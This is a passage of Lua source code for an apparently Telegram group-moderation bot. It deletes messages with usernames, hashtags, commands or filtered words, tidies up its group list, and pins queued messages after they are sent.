DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text:match("(.*)(@)(.*)") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text:match("@") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("(.*)(#)(.*)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("#") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
local MILANAbot = database:get(bot_id.."MILAN1:Add:Filter:Rp2"..text..result.chat_id_)   
if MILANAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..MILANAbot.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/R_IQ9)}\n🚫┇["..MILANAbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end
------------------------------------------------------------------------
if text:match("/") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text:match("(.*)(/)(.*)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text then
local MILAN1_Msg = database:get(bot_id.."MILAN1:Add:Filter:Rp2"..text..result.chat_id_)   
if MILAN1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..MILAN1_Msg)
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
------------------------------------------------------------------------

elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end         
local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',v)  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v)  
end 
end,nil)
end

elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end

if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end


end -- end new msg
end -- end callback














